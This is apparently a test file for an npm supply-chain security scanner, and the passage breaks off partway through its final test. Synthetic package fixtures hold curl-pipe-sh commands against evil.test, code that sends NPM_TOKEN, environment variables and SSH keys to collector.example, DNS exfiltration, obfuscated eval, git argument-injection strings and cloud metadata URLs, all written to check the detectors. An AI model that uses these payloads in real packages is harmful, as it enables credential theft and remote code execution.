import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { describe, it } from "node:test";
import { gunzipSync, gzipSync } from "node:zlib";
import {
  validateGitRef,
  validateGitSubdir,
  validateRemoteGitUrl,
  verifyTarballVsGitParity,
  walkGitHistoryForCleanAnchor,
} from "../src/analysis/parity-and-bisect.ts";
import { escapeMarkdownCell, RULESET_SHA256, triageUnpackedEntries } from "../src/analysis/static-triage.ts";
import { SingleFlight, SplitPlaneCache } from "../src/cache/sqlite-store.ts";
import { appendAuditEvent, verifyAuditLog } from "../src/compliance/audit-log.ts";
import { DEFAULT_POLICY, loadNpmrc, loadPolicy, routeDiscoveryQuery, routeRegistry } from "../src/config/policy.ts";
import {
  auditDependencyConfusion,
  fetchWithSafeRedirects,
  inspectNpmAttestationBundle,
  validateOutboundUrl,
  verifyNpmAttestationPayload,
} from "../src/intel/registry-osv.ts";
import { computeSha512Integrity, unpackTarballInMemory, validateArchivePath } from "../src/quarantine/safe-unpack.ts";
import { ENGINE_VERSION } from "../src/types.ts";
import {
  assembleInspectionReport,
  buildReaEscalationPlan,
  checkLocalWorkspaceCompromised,
  formatAnchorMarkdown,
  formatCycloneDxSbom,
  formatInspectionMarkdownCard,
} from "../src/verdict/engine-and-formatters.ts";
import { buildSyntheticTgz, buildTestNpmSlsaAttestation } from "./helpers.ts";

const DUMMY_CAPS = {
  node_version: process.version,
  git_available: true,
  git_partial_clone_supported: true,
  rea_cli_available: false,
  sqlite_available: true,
};

function buildPaxTar(records: string, targetName: string, content: string, typeflag = "x"): Buffer {
  const blocks: Buffer[] = [];
  const makeHeader = (name: string, size: number, tf: string) => {
    const h = Buffer.alloc(512, 0);
    h.write(name, 0, Math.min(100, Buffer.byteLength(name)), "utf8");
    h.write("0000644\0", 100, 8, "ascii");
    h.write("0000000\0", 108, 8, "ascii");
    h.write("0000000\0", 116, 8, "ascii");
    h.write(`${size.toString(8).padStart(11, "0")}\0`, 124, 12, "ascii");
    h.write("00000000000\0", 136, 12, "ascii");
    h.write("        ", 148, 8, "ascii");
    h.write(tf, 156, 1, "ascii");
    h.write("ustar\0", 257, 6, "ascii");
    h.write("00", 263, 2, "ascii");
    let sum = 0;
    for (let i = 0; i < 512; i++) sum += h[i] ?? 0;
    h.write(`${sum.toString(8).padStart(6, "0")}\0 `, 148, 8, "ascii");
    return h;
  };
  const pushData = (buf: Buffer) => {
    blocks.push(buf);
    const rem = buf.length % 512;
    if (rem !== 0) blocks.push(Buffer.alloc(512 - rem, 0));
  };

  const paxBuf = Buffer.from(records, "utf8");
  blocks.push(makeHeader("PaxHeader", paxBuf.length, typeflag));
  pushData(paxBuf);

  const bodyBuf = Buffer.from(content, "utf8");
  blocks.push(makeHeader(targetName, bodyBuf.length, "0"));
  pushData(bodyBuf);

  blocks.push(Buffer.alloc(1024, 0));
  return gzipSync(Buffer.concat(blocks));
}

function paxLine(key: string, val: string): string {
  const rest = ` ${key}=${val}\n`;
  let len = Buffer.byteLength(rest) + 1;
  while (Buffer.byteLength(`${len}${rest}`) !== len) {
    len = Buffer.byteLength(`${len}${rest}`);
  }
  return `${len}${rest}`;
}

describe("Enterprise Hardening, Evasion Closure, Network Isolation, Concurrency & Packaging", () => {
  it("closes static-triage evasion vectors: template literals, Unicode escapes, multi-hop taint, DNS/exec sinks, spread, and 0x obfuscation", async () => {
    const hexPayload = Buffer.from("require('child_process').exec('curl https://evil.test | sh')").toString("hex");
    const tgz = buildSyntheticTgz([
      {
        name: "package/package.json",
        content: JSON.stringify({ name: "evasion-suite", version: "1.0.0", license: "MIT" }),
      },
      {
        name: "package/tpl.js",
        content: "const t = process.env.NPM_TOKEN; fetch(`https://collector.example/?k=${t}`);",
      },
      {
        name: "package/uni.js",
        content: 'globalThis["\\u0065\\u0076\\u0061\\u006c"]("1+1"); const c = String.fromCharCode(99,117,114,108,32,104,116,116,112,115,58,47);',
      },
      {
        name: "package/multihop.js",
        content:
          "import dns from 'node:dns'; const raw = process['env']['AWS_SECRET_ACCESS_KEY']; const enc = Buffer.from(raw).toString('hex'); const host = enc + '.x.example'; dns.lookup(host, () => {});",
      },
      {
        name: "package/spread-and-exec.js",
        content:
          "import { execSync } from 'node:child_process'; const copy = { ...process.env }; execSync('curl https://cdn.example/drop.sh | sh'); console.log(copy);",
      },
      {
        name: "package/hex.js",
        content: `const h = "${hexPayload}"; console.log(h.length);`,
      },
    ]);

    const unpack = await unpackTarballInMemory(tgz, DEFAULT_POLICY);
    const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
    const byFile = (file: string) => new Set(triage.observations.filter((o) => o.path === file).map((o) => o.code));

    assert.ok(byFile("tpl.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "template literal taint must be caught");
    assert.ok(byFile("uni.js").has("OBFUSCATED_DYNAMIC_EXEC"), "unicode-escaped eval & fromCharCode must be caught");
    assert.ok(byFile("multihop.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "multi-hop DNS taint must be caught");
    assert.ok(byFile("spread-and-exec.js").has("ENV_SERIALIZATION_EXFIL"), "object spread of process.env must be caught");
    assert.ok(byFile("spread-and-exec.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "direct child_process curl-pipe-sh must be caught");
    assert.ok(byFile("hex.js").has("BASE64_PAYLOAD_SUSPICIOUS"), "hex-encoded command payload must be caught");
  });

  it("handles regex literals with //, Map.get, path.resolve, and RegExp.exec without false positives", async () => {
    const tgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "clean-regex-cli", version: "1.0.0", license: "MIT" }) },
      {
        name: "package/index.js",
        content: `
          import path from "node:path";
          const re = /https?:\\/\\//i;
          const m = /foo/.exec("foobar");
          const cache = new Map();
          const v = cache.get("a") ?? path.resolve(".", "x");
          const mode = process.env.NODE_ENV;
          console.log(\`ok=\${re.test("https://example.org")} \${mode} \${m?.[0]} \${v}\`);
        `,
      },
    ]);
    const unpack = await unpackTarballInMemory(tgz, DEFAULT_POLICY);
    const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
    assert.equal(triage.observations.length, 0);
  });

  it("hardens tar unpacker against bad checksums, PAX linkpath smuggling, and Windows illegal chars", async () => {
    assert.equal(validateArchivePath("package/bad<name>.js").safe, false);
    assert.equal(validateArchivePath("package/bad|pipe.js").safe, false);
    assert.equal(validateArchivePath("package/bad?q.js").safe, false);

    // PAX linkpath smuggling must be rejected as CRITICAL
    const paxLinkTar = buildPaxTar(
      paxLine("path", "package/sneaky.js") + paxLine("linkpath", "/etc/passwd"),
      "package/placeholder",
      "ok",
      "x",
    );
    const linkRes = await unpackTarballInMemory(paxLinkTar, DEFAULT_POLICY);
    assert.ok(linkRes.observations.some((o) => o.code === "ARCHIVE_UNSAFE_LINK_OR_DEVICE" && o.severity === "CRITICAL"));

    // Valid PAX UTF-8 path must unpack cleanly
    const paxOkTar = buildPaxTar(paxLine("path", "package/café-cli.js"), "package/fallback", "export const x = 1;", "x");
    const okRes = await unpackTarballInMemory(paxOkTar, DEFAULT_POLICY);
    assert.equal(okRes.ok, true);
    assert.equal(okRes.entries[0]?.path, "café-cli.js");

    // Corrupted tar header checksum must fail closed
    const badTar = Buffer.alloc(1536, 0);
    badTar.write("package/index.js", 0, "utf8");
    badTar.write("0000123\0", 148, 8, "ascii");
    const chkRes = await unpackTarballInMemory(gzipSync(badTar), DEFAULT_POLICY);
    assert.equal(chkRes.ok, false);
    assert.ok(chkRes.observations.some((o) => o.code === "ARCHIVE_CORRUPT_HEADER_CHECKSUM"));
  });

  it("blocks Git argument injection, unsafe refs/subdirs, provenance-masked local drift, and tarball-only compromises", async () => {
    assert.equal(validateRemoteGitUrl("https://github.com/org/repo.git").valid, true);
    assert.equal(validateRemoteGitUrl("--upload-pack=calc.exe").valid, false);
    assert.equal(validateRemoteGitUrl("ext::sh -c id").valid, false);
    assert.equal(validateRemoteGitUrl("file:///etc/passwd").valid, false);
    assert.equal(validateRemoteGitUrl("ssh://git@github.com/org/repo.git").valid, false);
    assert.equal(validateRemoteGitUrl("https://169.254.169.254/latest/meta-data/").valid, false);

    assert.equal(validateGitRef("HEAD"), true);
    assert.equal(validateGitRef("a".repeat(40)), true);
    assert.equal(validateGitRef("--output=/tmp/pwn"), false);
    assert.equal(validateGitSubdir("packages/cli"), true);
    assert.equal(validateGitSubdir("../escape"), false);
    assert.equal(validateGitSubdir("--option"), false);

    const repoDir = mkdtempSync(join(tmpdir(), "coldpin-git-hard-"));
    try {
      const git = (args: string[]) => execFileSync("git", args, { cwd: repoDir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
      git(["init", "-b", "main"]);
      git(["config", "user.name", "T"]);
      git(["config", "user.email", "t@e.com"]);

      // Commit 1 (v1.0.0 clean release)
      writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@org/app", version: "1.0.0", license: "MIT", bin: { mybin: "./cli.js" } }));
      writeFileSync(join(repoDir, "cli.js"), "console.log('v1');\n");
      git(["add", "."]);
      git(["commit", "-m", "v1.0.0"]);
      const c1 = git(["rev-parse", "HEAD"]);

      // Commit 2 (untagged clean docs tweak between releases)
      writeFileSync(join(repoDir, "README.md"), "# docs\n");
      git(["add", "."]);
      git(["commit", "-m", "docs"]);
      const c2 = git(["rev-parse", "HEAD"]);

      // Commit 3 (HEAD clean in Git, but v2.0.0 tarball published compromised!)
      writeFileSync(join(repoDir, "package.json"), JSON.stringify({ name: "@org/app", version: "2.0.0", license: "MIT", bin: { mybin: "./cli.js" } }));
      git(["add", "."]);
      git(["commit", "-m", "v2.0.0"]);
      const c3 = git(["rev-parse", "HEAD"]);

      // Local Git drift MUST still trigger even when provenanceAttested=true
      const drift = await verifyTarballVsGitParity({
        tarballManifest: { name: "@org/app", version: "2.0.0", scripts: { postinstall: "curl https://evil.test | sh" } },
        tarballEntries: [],
        provenanceAttested: true,
        gitHead: c3,
        localGitDir: repoDir,
      });
      assert.equal(drift.tier, "TARBALL_SOURCE_DRIFT");

      // Tarball-only compromise on v2.0.0 (c3) must skip untagged clean c2 and recover verified clean release v1.0.0 (c1)
      const relMap = new Map([
        [c1, { version: "1.0.0", tarball_sha512: "sha512-CLEAN1==", provenance_attested: true }],
        [c3, { version: "2.0.0", tarball_sha512: "sha512-BAD2==", provenance_attested: false }],
      ]);
      const decision = await walkGitHistoryForCleanAnchor({
        package_name: "@org/app",
        repoUrlOrLocalPath: repoDir,
        isLocalDir: true,
        binName: "mybin",
        policy: DEFAULT_POLICY,
        releaseTarballByCommit: relMap,
        compromisedVersions: new Set(["2.0.0"]),
      });
      assert.equal(decision.recommended_action, "ROLLBACK_TO_SAFE_ANCHOR");
      assert.equal(decision.safe_anchor?.version, "1.0.0");
      assert.equal(decision.safe_anchor?.commit_sha, c1);
      assert.ok(decision.safe_anchor?.pinned_execution.command?.endsWith(" -- mybin"));
      assert.ok(c2.length === 40);
    } finally {
      rmSync(repoDir, { recursive: true, force: true });
    }
  });

  it("enforces SSRF metadata blocks, cross-origin redirect bearer-token stripping, and multi-token private-scope isolation", async () => {
    assert.equal(validateOutboundUrl("http://169.254.169.254/latest/meta-data/").ok, false);
    assert.equal(validateOutboundUrl("https://metadata.google.internal/computeMetadata/v1/").ok, false);
    assert.equal(validateOutboundUrl("file:///etc/shadow").ok, false);

    // Multi-word discovery query containing embedded private scope or prefix must NEVER route to public npm
    const dir = mkdtempSync(join(tmpdir(), "coldpin-pol-"));
    try {
      writeFileSync(
        join(dir, ".coldpin.policy.json"),
        JSON.stringify({
          private_scopes: ["@Acme"],
          private_prefixes: ["acme-internal-"],
          private_registries: { "@Acme": "https://artifactory.acme.internal/npm" },
        }),
      );
      const { policy, policy_path } = loadPolicy(dir);
      assert.ok(policy_path?.endsWith(".coldpin.policy.json"));
      const npmrc = loadNpmrc(dir);
      // Mixed-case @Acme registry key must normalize cleanly
      assert.equal(routeRegistry("@acme/cli", policy, npmrc).route, "private");
      assert.equal(routeDiscoveryQuery("find @acme/deploy-cli tool", undefined, policy, npmrc).route, "private");
      assert.equal(routeDiscoveryQuery("find @amce/deploy-cli tool", undefined, policy, npmrc).route, "blocked_typo");
      assert.equal(routeDiscoveryQuery("search acme-internal-billing", undefined, policy, npmrc).route, "blocked_unconfigured");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }

    // Real local two-server cross-origin redirect test proving Authorization bearer token is stripped on redirect
    let targetSawAuth: string | undefined = "UNSET";
    let originSawAuth: string | undefined = "UNSET";
    const targetSrv = createServer((req, res) => {
      targetSawAuth = req.headers["authorization"];
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    });
    await new Promise<void>((r) => targetSrv.listen(0, "127.0.0.1", () => r()));
    const targetPort = (targetSrv.address() as AddressInfo).port;

    const originSrv = createServer((req, res) => {
      originSawAuth = req.headers["authorization"];
      res.writeHead(302, { location: `http://127.0.0.1:${targetPort}/tarball.tgz` });
      res.end();
    });
    await new Promise<void>((r) => originSrv.listen(0, "127.0.0.1", () => r()));
    const originPort = (originSrv.address() as AddressInfo).port;

    try {
      const originUrl = `http://127.0.0.1:${originPort}/pkg`;
      const targetOrigin = `http://127.0.0.1:${targetPort}`;
      const ctrl = new AbortController();
      // First hop is plaintext HTTP: [MCP-09] MUST refuse attaching Bearer over non-HTTPS AND block cross-origin plain HTTP redirect!
      const crossHttpBlocked = await fetchWithSafeRedirects({
        url: originUrl,
        headers: { "user-agent": "test" },
        authToken: "SUPER_SECRET_NPM_TOKEN",
        allowedAuthOrigin: `http://127.0.0.1:${originPort}`,
        allowPlainHttpOrigin: `http://127.0.0.1:${originPort}`,
        signal: ctrl.signal,
      });
      assert.equal(originSawAuth, undefined, "Authorization header MUST NEVER be sent over plaintext HTTP");
      assert.equal(crossHttpBlocked.ok, false); // Plain HTTP cross-origin blocked!
      assert.equal(targetSawAuth, "UNSET");

      // Even when target origin IS explicitly allowed plain HTTP, bearer token MUST be stripped because allowedAuthOrigin != targetOrigin
      const resStrip = await fetchWithSafeRedirects({
        url: `${targetOrigin}/tarball.tgz`,
        headers: { "user-agent": "test" },
        authToken: "SUPER_SECRET_NPM_TOKEN",
        allowedAuthOrigin: `http://127.0.0.1:${originPort}`,
        allowPlainHttpOrigin: targetOrigin,
        signal: ctrl.signal,
      });
      assert.equal(resStrip.ok, true);
      assert.equal(targetSawAuth, undefined, "Authorization header MUST be stripped on cross-origin request");
    } finally {
      targetSrv.close();
      originSrv.close();
    }
  });

  it("supports SingleFlight dedup, SplitPlaneCache inspect hit, concurrent locked audit appends, multi-lockfile detection, CycloneDX VEX, and REA plans", async () => {
    // 1. SingleFlight deduplicates concurrent producers
    const sf = new SingleFlight<number>();
    let runs = 0;
    const vals = await Promise.all(
      Array.from({ length: 8 }, () =>
        sf.run("same-key", async () => {
          runs++;
          await new Promise((r) => setTimeout(r, 15));
          return 42;
        }),
      ),
    );
    assert.equal(runs, 1);
    assert.deepEqual(vals, Array(8).fill(42));

    // 2. Concurrent multi-process audit log appends maintain a 100% valid hash chain via atomic lockfile
    const workDir = mkdtempSync(join(tmpdir(), "coldpin-conc-"));
    try {
      const auditPath = join(workDir, "audit.jsonl");
      const cacheDir = join(workDir, "cache");
      const tgzPath = join(workDir, "clean.tgz");
      writeFileSync(
        tgzPath,
        buildSyntheticTgz([
          { name: "package/package.json", content: JSON.stringify({ name: "cache-test", version: "1.0.0", license: "MIT" }) },
          { name: "package/index.js", content: "console.log('hi');\n" },
        ]),
      );

      // Run 2 sequential CLI inspects against same cache dir with --verbose to confirm cache_hit=false -> cache_hit=true
      const cliPath = resolve("src/cli.ts");
      const runCliVerbose = () =>
        new Promise<{ code: number; stderr: string }>((res) => {
          const p = spawn(process.execPath, [
            "--no-warnings",
            cliPath,
            "inspect",
            "--tarball",
            tgzPath,
            "--offline",
            "--cache-dir",
            cacheDir,
            "--audit-log",
            auditPath,
            "--override-ticket",
            "SEC-1234",
            "--verbose",
            "--json",
          ]);
          let stderr = "";
          p.stderr.on("data", (d) => (stderr += String(d)));
          p.on("close", (code) => res({ code: code ?? 1, stderr }));
        });

      const r1 = await runCliVerbose();
      const r2 = await runCliVerbose();
      assert.equal(r1.code, 2); // offline -> UNVERIFIABLE_UNKNOWN
      assert.equal(r2.code, 2);
      assert.ok(r1.stderr.includes('"cache_hit":false'));
      assert.ok(r2.stderr.includes('"cache_hit":true'));

      // Fire 6 concurrent CLI processes appending to the SAME audit.jsonl simultaneously
      await Promise.all(Array.from({ length: 6 }, () => runCliVerbose()));
      const verified = verifyAuditLog(auditPath);
      assert.equal(verified.valid, true, `Concurrent audit chain corrupted: ${verified.reason}`);
      assert.equal(verified.total_events, 8);

      // 3. Multi-lockfile compromise detection: pnpm-lock.yaml and yarn.lock
      const pnpmDir = join(workDir, "pnpm-proj");
      mkdirSync(pnpmDir, { recursive: true });
      writeFileSync(pnpmDir + "/pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  bad-pkg@2.3.4:\n    resolution: {}\n");
      const pnpmHit = checkLocalWorkspaceCompromised(pnpmDir, "bad-pkg", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(pnpmHit?.lockfile_kind, "pnpm-lock.yaml");
      assert.equal(pnpmHit?.matched_version, "2.3.4");

      const yarnDir = join(workDir, "yarn-proj");
      mkdirSync(yarnDir, { recursive: true });
      writeFileSync(yarnDir + "/yarn.lock", '"@org/bad@^1.0.0":\n  version "1.4.2"\n  resolved "https://registry.yarnpkg.com/x"\n');
      const yarnHit = checkLocalWorkspaceCompromised(yarnDir, "@org/bad", "MALICIOUS_INDICATORS_FOUND");
      assert.equal(yarnHit?.lockfile_kind, "yarn.lock");
      assert.equal(yarnHit?.matched_version, "1.4.2");

      // 4. CycloneDX 1.5 SBOM + VEX & REA Escalation Plan + Markdown cell escaping
      const wasmTgz = buildSyntheticTgz([
        { name: "package/package.json", content: JSON.stringify({ name: "wasm-tool", version: "1.0.0", license: "MIT", dependencies: { chalk: "5.3.0" } }) },
        { name: "package/mod.wasm", content: Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]) },
      ]);
      const unpack = await unpackTarballInMemory(wasmTgz, DEFAULT_POLICY);
      const triage = triageUnpackedEntries(unpack.entries, DEFAULT_POLICY);
      const report = assembleInspectionReport({
        package_name: "wasm-tool",
        version: "1.0.0",
        org_or_scope: "unscoped",
        creator: "dev|pipe`tick",
        category_tags: [],
        summary: "Tool | with | pipes",
        license: "MIT",
        bin_names: [],
        unpack,
        triage,
        parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
        advisories: [
          {
            id: "GHSA-xxxx-yyyy-zzzz",
            is_malicious: false,
            severity: "HIGH",
            kev: true,
            summary: "Known exploited issue",
            package_name: "wasm-tool",
            affected_version: "1.0.0",
          },
        ],
        registryObservations: [],
        registryUnknowns: [],
        policy: DEFAULT_POLICY,
        host_capabilities: DUMMY_CAPS,
        cwd: workDir,
      });

      const plan = buildReaEscalationPlan({ triage, parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] }, host_capabilities: DUMMY_CAPS });
      assert.ok(plan?.steps.some((s) => s.recommended_tool === "inspect_wasm_artifact"));
      assert.ok(report.rea_escalation_plan);

      const card = formatInspectionMarkdownCard(report);
      assert.ok(card.includes("### REA Tier-2 Escalation Plan"));
      assert.equal(escapeMarkdownCell("a|b`c"), "a\\|b'c");

      const sbom = formatCycloneDxSbom(report, triage.manifest?.dependencies) as {
        serialNumber?: string;
        vulnerabilities?: Array<{ id: string; analysis: { state: string } }>;
        dependencies?: Array<{ dependsOn: string[] }>;
      };
      assert.ok(sbom.serialNumber?.startsWith("urn:uuid:"));
      assert.equal(sbom.vulnerabilities?.[0]?.id, "GHSA-xxxx-yyyy-zzzz");
      assert.equal(sbom.vulnerabilities?.[0]?.analysis.state, "exploitable");
      assert.equal(sbom.dependencies?.[0]?.dependsOn.length, 1);

      // SplitPlaneCache stats & pruning
      const memCache = new SplitPlaneCache(":memory:");
      memCache.putThreatIntel({ intel_key: "k1", source: "osv", payload: [], ttl_seconds: 1, now_ms: 1000 });
      assert.equal(memCache.getStats().threat_intel_count, 1);
      assert.equal(memCache.pruneExpiredIntel(5000), 1);
      assert.equal(memCache.getStats().threat_intel_count, 0);
      memCache.close();
    } finally {
      rmSync(workDir, { recursive: true, force: true });
    }
  });

  it("enforces EGM reproducible packaging, manifest/link validation, --no-overwrite refusal, and workspace mirror byte parity", () => {
    const outDir = mkdtempSync(join(tmpdir(), "coldpin-pack-"));
    try {
      // 1. Fresh build across all targets succeeds & verifies byte-for-byte reproducibility + internal links
      const out1 = execFileSync(
        "python",
        ["scripts/pack_plugin.py", "--target", "all", "--out-dir", outDir, "--verify", "--no-overwrite"],
        { encoding: "utf8" },
      );
      assert.ok(out1.includes("PACK REPRODUCIBLE OK [antigravity]"));
      assert.ok(out1.includes("PACK REPRODUCIBLE OK [claude]"));
      assert.ok(out1.includes("PACK REPRODUCIBLE OK [openai]"));
      assert.ok(existsSync(join(outDir, "coldpin-antigravity.zip")));

      // 2. Second build to same outDir with --no-overwrite MUST fail closed (EGM overwrite refusal)
      let failed = false;
      try {
        execFileSync(
          "python",
          ["scripts/pack_plugin.py", "--target", "antigravity", "--out-dir", outDir, "--no-overwrite"],
          { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] },
        );
      } catch {
        failed = true;
      }
      assert.equal(failed, true, "pack_plugin.py --no-overwrite must refuse overwriting existing archives");

      // 3. Verify workspace mirror .agents/skills/coldpin matches skills/coldpin byte-for-byte
      const srcRoot = resolve("skills/coldpin");
      const mirrorRoot = resolve(".agents/skills/coldpin");
      const listFiles = (dir: string, prefix = ""): string[] => {
        const res: string[] = [];
        for (const name of readdirSync(dir, { withFileTypes: true })) {
          const rel = prefix ? `${prefix}/${name.name}` : name.name;
          if (name.isDirectory()) res.push(...listFiles(join(dir, name.name), rel));
          else if (name.isFile()) res.push(rel);
        }
        return res.sort();
      };
      const srcFiles = listFiles(srcRoot);
      const mirrorFiles = listFiles(mirrorRoot);
      assert.deepEqual(mirrorFiles, srcFiles);
      for (const rel of srcFiles) {
        assert.deepEqual(readFileSync(join(mirrorRoot, rel)), readFileSync(join(srcRoot, rel)), `Mirror drift in ${rel}`);
      }

      // 4. Verify runtime zips exclude .github/ and tests/, package.json declares explicit allowlist, RULESET_SHA256 tracks ENGINE_VERSION, and self-audit emits dynamic version + LF
      const zipCheckOut = execFileSync(
        "python",
        [
          "-B",
          "-c",
          [
            "import json, pathlib, sys, zipfile",
            "out_dir = pathlib.Path(sys.argv[1])",
            "for t in ('antigravity', 'claude', 'openai'):",
            "  with zipfile.ZipFile(out_dir / f'coldpin-{t}.zip') as zf:",
            "    names = zf.namelist()",
            "    assert not any(n.startswith('.github/') or n.startswith('tests/') for n in names), f'{t} leaked dev files'",
            "sys.path.insert(0, 'scripts')",
            "import lint_skill as ls, self_audit_skillspector as sa",
            "assert ls.extract_skill_card_version('## Skill Version(s): <br>\\n1.2.0 (source: x)') == '1.2.0'",
            "assert ls.extract_skill_card_version('## Skill Version(s): <br>\\n1.2.0-beta.1 (source: x)') == '1.2.0-beta.1'",
            "assert ls.extract_skill_card_version('## Skill Version(s): <br>\\n1.1.0 (source: x)') == '1.1.0'",
            "assert ls.extract_skill_md_version('  version: \"1.2.0\"\\n') == '1.2.0'",
            "assert ls.extract_skill_md_version('  version: \"1.2.0-rc.1\"\\n') == '1.2.0-rc.1'",
            "sarif_tmp = out_dir / 'tmp.sarif'; md_tmp = out_dir / 'tmp.md'",
            "findings = sa.scan_repo()",
            "sa.emit_sarif(findings, sarif_tmp); sa.emit_triage_report(findings, md_tmp)",
            "assert b'\\r\\n' not in sarif_tmp.read_bytes(), 'SARIF emitted CRLF'",
            "assert b'\\r\\n' not in md_tmp.read_bytes(), 'Self-audit report emitted CRLF'",
            "sarif_ver = json.loads(sarif_tmp.read_text(encoding='utf-8'))['runs'][0]['tool']['driver']['version']",
            "assert sarif_ver == sys.argv[2], f'SARIF version drift: {sarif_ver} != {sys.argv[2]}'",
            "print('HYGIENE_AND_ALLOWLIST_OK')",
          ].join("\n"),
          outDir,
          ENGINE_VERSION,
        ],
        { encoding: "utf8" },
      );
      assert.ok(zipCheckOut.includes("HYGIENE_AND_ALLOWLIST_OK"));

      const pkgJson = JSON.parse(readFileSync(resolve("package.json"), "utf8")) as { version: string; files?: string[] };
      assert.equal(pkgJson.version, ENGINE_VERSION);
      assert.ok(Array.isArray(pkgJson.files) && pkgJson.files.includes("lib/") && !pkgJson.files.includes("src/") && !pkgJson.files.some((f) => f.startsWith("tests") || f.startsWith(".github")));
      const expectedRulesetHash = createHash("sha256")
        .update(`v${ENGINE_VERSION}|${readFileSync(resolve("catalog/triage-rules.json"), "utf8")}`)
        .digest("hex");
      assert.equal(RULESET_SHA256, expectedRulesetHash);
    } finally {
      rmSync(outDir, { recursive: true, force: true });
    }
  });

  it("blocks shell injection via package.json bin, closes cross-file/wrapper/Reflect/path.join/identifier evasions, tar EOF/PAX/K smuggling, IPv6-mapped SSRF, KEV-on-HEAD, non-monotonic bisect, Yarn Berry, nested npm lock, and audit extra-field tampering", async () => {
    // 1. Manifest bin key shell injection MUST fail as MALICIOUS_INDICATORS_FOUND and emit command: null
    const binInjTgz = buildSyntheticTgz([
      {
        name: "package/package.json",
        content: JSON.stringify({
          name: "innocent-tool",
          version: "1.0.0",
          license: "MIT",
          bin: { "cli; curl https://evil.test | sh #": "./index.js" },
        }),
      },
      { name: "package/index.js", content: "console.log('ok');" },
    ]);
    const binUnpack = await unpackTarballInMemory(binInjTgz, DEFAULT_POLICY);
    const binTriage = triageUnpackedEntries(binUnpack.entries, DEFAULT_POLICY);
    const binReport = assembleInspectionReport({
      package_name: "innocent-tool",
      version: "1.0.0",
      org_or_scope: "unscoped",
      creator: "a",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: Object.keys((binTriage.manifest?.bin as Record<string, string>) ?? {}),
      unpack: binUnpack,
      triage: binTriage,
      parity: { tier: "PROVENANCE_ATTESTED", provenance_attested: true, observations: [], unknowns: [] },
      advisories: [],
      registryObservations: [],
      registryUnknowns: [],
      policy: DEFAULT_POLICY,
      host_capabilities: DUMMY_CAPS,
      cwd: tmpdir(),
    });
    assert.equal(binReport.verdict, "MALICIOUS_INDICATORS_FOUND");
    assert.equal(binReport.pinned_execution.command, null);
    assert.ok(binTriage.observations.some((o) => o.code === "MANIFEST_SHELL_INJECTION_META"));

    // 2. Cross-file split-payload taint + wrapper sink + path.join('.ssh','id_rsa') + {env}=process + Reflect.get + var-stored execSync + constructor.constructor + ev\u0061l
    const advTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "adv-evade", version: "1.0.0", license: "MIT" }) },
      { name: "package/a.js", content: "export const secret = process.env.NPM_TOKEN;" },
      { name: "package/b.js", content: 'import { secret } from "./a.js"; fetch("https://collector.example/hit", { method: "POST", body: secret });' },
      { name: "package/f1.js", content: 'const send = (x) => fetch("https://collector.example/x", { method: "POST", body: x }); send(process.env.NPM_TOKEN);' },
      { name: "package/f2.js", content: 'import fs from "node:fs"; import path from "node:path"; import os from "node:os"; const k = fs.readFileSync(path.join(os.homedir(), ".ssh", "id_rsa"), "utf8"); fetch("https://collector.example/k", { body: k });' },
      { name: "package/f3.js", content: 'const { env } = process; fetch("https://collector.example/e", { body: JSON.stringify(env) });' },
      { name: "package/f4.js", content: 'import { execSync } from "node:child_process"; const cmd = "curl https://evil.test/s | sh"; execSync(cmd);' },
      { name: "package/f5.js", content: '[].constructor.constructor("return process.exit(0)")();' },
      { name: "package/f6.js", content: 'const e = Reflect.get(process, "env"); fetch("https://collector.example/r", { body: JSON.stringify(e) });' },
      { name: "package/f7.js", content: 'ev\\u0061l("1+1");' },
    ]);
    const advUnpack = await unpackTarballInMemory(advTgz, DEFAULT_POLICY);
    const advTriage = triageUnpackedEntries(advUnpack.entries, DEFAULT_POLICY);
    const codesFor = (f: string) => new Set(advTriage.observations.filter((o) => o.path === f).map((o) => o.code));
    assert.ok(codesFor("b.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "cross-file split-payload taint must be caught");
    assert.ok(codesFor("f1.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "wrapper sink function taint must be caught");
    assert.ok(codesFor("f2.js").has("CREDENTIAL_FILE_ACCESS") && codesFor("f2.js").has("TAINT_CRED_TO_NETWORK_OR_EXEC"), "path.join .ssh/id_rsa must be caught");
    assert.ok(codesFor("f3.js").has("ENV_SERIALIZATION_EXFIL"), "{ env } = process serialization must be caught");
    assert.ok(codesFor("f4.js").has("CHILD_PROCESS_DANGEROUS_EXEC"), "var-stored execSync command must be caught");
    assert.ok(codesFor("f5.js").has("OBFUSCATED_DYNAMIC_EXEC"), "constructor.constructor must be caught");
    assert.ok(codesFor("f6.js").has("ENV_SERIALIZATION_EXFIL"), "Reflect.get(process, 'env') must be caught");
    assert.ok(codesFor("f7.js").has("OBFUSCATED_DYNAMIC_EXEC"), "Unicode-escaped identifier ev\\u0061l must be caught");

    // 3. Tar EOF single-zero-block smuggling, malformed PAX, GNU 'K' LongLink, and hidden Unicode path
    const cleanRaw = gunzipSync(buildSyntheticTgz([{ name: "package/package.json", content: "{}" }]));
    const evilRaw = gunzipSync(buildSyntheticTgz([{ name: "package/evil.js", content: "eval('1');" }]));
